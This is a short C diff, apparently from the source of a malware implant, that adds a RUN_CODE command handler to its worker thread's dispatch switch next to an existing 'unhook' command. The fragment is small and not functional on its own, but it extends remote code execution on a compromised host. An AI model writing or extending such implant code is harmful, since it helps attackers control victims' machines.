@@ -66,6 +66,14 @@ DWORD WINAPI wrkr_thread(struct new_thread_params_t* params) {
         implant_unhookbyon(&trans, unhook_byon_req);
         break;
     }
+    case RUN_CODE: {
+        struct runcode_msg_t* runcode_msg =
+            &msg.runcode;
+        struct runcode_req_t* runcode_req =
+            &runcode_msg->req;
+        implant_runcode(&trans, runcode_req);
+        break;
+    }
     default:
         break;
     }
